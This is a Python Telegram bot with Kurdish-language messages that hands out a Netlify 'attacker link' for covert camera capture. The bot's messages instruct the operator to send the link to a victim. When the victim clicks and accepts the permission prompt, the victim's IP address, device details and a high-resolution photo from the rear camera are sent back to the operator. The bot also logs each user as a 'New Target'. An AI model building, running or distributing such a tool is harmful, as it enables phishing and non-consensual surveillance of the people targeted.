import os
import sys
import time
import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# تووکن لە ژینگەی سێرڤەرەوە دەخوێنرێتەوە (بۆ پاراستنی تەواو لە گیتهەب)
BOT_TOKEN = os.environ.get("BOT_TOKEN")
NETLIFY_LINK = "https://sprightly-druid-6a0923.netlify.app/"

if not BOT_TOKEN:
    print("[!] ERROR: BOT_TOKEN is not set in the environment variables!")
    sys.exit(1)

bot = telebot.TeleBot(BOT_TOKEN)

# تابلۆی پێشوازیکردنی شاهانە
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user = message.from_user
    user_name = user.first_name
    username = f"@{user.username}" if user.username else "N/A"
    user_id = user.id
    
    print(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] 🚨 New Target Connected -> Name: {user_name} | ID: {user_id} | Username: {username}")
    
    welcome_text = (
        f"💀 **بەخێر بێیت بۆ ژووری ئۆپەراسیۆنە تیتانیۆمییەکان، {user_name}!** 💀\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n"
        "⚡ **سیستەمی کۆکردنەوەی زانیاری و وێنەی 4K:**\n"
        "• دۆخی سێرڤەر: `ONLINE & SECURE`\n"
        "• ئاستی پارێزربی: `MILITARY-GRADE (NO TOKEN LEAK)`\n"
        "━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "👇 بۆ وەرگرتنی لینکی هێرشبەر، کلیک لەسەر دوگمەی خوارەوە بکە:"
    )
    
    # تەنها دوو دوگمەی خاوێن و پێویست
    markup = InlineKeyboardMarkup()
    markup.row_width = 1
    markup.add(
        InlineKeyboardButton("🔗 وەرگرتنی لینکی کامێرا", callback_data="get_link"),
        InlineKeyboardButton("🛡️ دەربارەی تیتانیۆم کۆر", callback_data="about")
    )
    
    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")

# بەڕێوەبردنی کلیلی سیستەمەکان
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == "get_link":
        response_text = (
            f"🎯 **فەرموو خاوەن، ئەمەش لینکی هێرشبەری زەبەلاح:**\n\n"
            f"`{NETLIFY_LINK}`\n\n"
            "📌 **ڕێنمایی بەکارهێنان:**\n"
            "1. لینکەکە بنێرە بۆ قوربانییەکە.\n"
            "2. کاتێک کرتە دەکات و پەنجەرەی ڕێگەپێدان دەبڕێت،\n"
            "3. ڕاستەوخۆ هەموو زانیارییە قورسەکان لەگەڵ **وێنەی 4Kـی ڕووناکی تەواو** دەگەڕێنەوە بۆ لای تۆ!"
        )
        bot.answer_callback_query(call.id, "لینکەکەت بە سەرکەوتوویی ئامادە کرا!")
        bot.send_message(call.message.chat.id, response_text, parse_mode="Markdown")

    elif call.data == "about":
        bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
        about_msg = (
            "💀 **دەربارەی سیستەمی تیتانیۆم کۆر** 💀\n\n"
            "ئەم بۆتە وەک ژووری ئۆپەراسیۆن و کۆنتڕۆڵی تۆ کار دەکات بۆ دروستکردن و دابەشکردنی لینکی هێرشبەر. "
            "ئامانجی سەرەکی کۆکردنەوەی زانیارییە وردەکانی ئامێر (IP، جۆری پاتری، گرافیک، و هتد) و وێنەگرتنی ڕەسەنی قوربانییە لە ڕێگەی کامێرای دواوەوە بە کوالێتی بەرز."
        )
        bot.send_message(call.message.chat.id, about_msg, parse_mode="Markdown")

if __name__ == '__main__':
    print("==========================================")
    print("💀 SECURE TITANIUM OMEGA BOT INITIALIZED 💀")
    print("==========================================")
    while True:
        try:
            bot.infinity_polling(timeout=60, long_polling_timeout=60)
        except Exception as e:
            print(f"[!] Connection Error Handled: {e}")
            time.sleep(3)
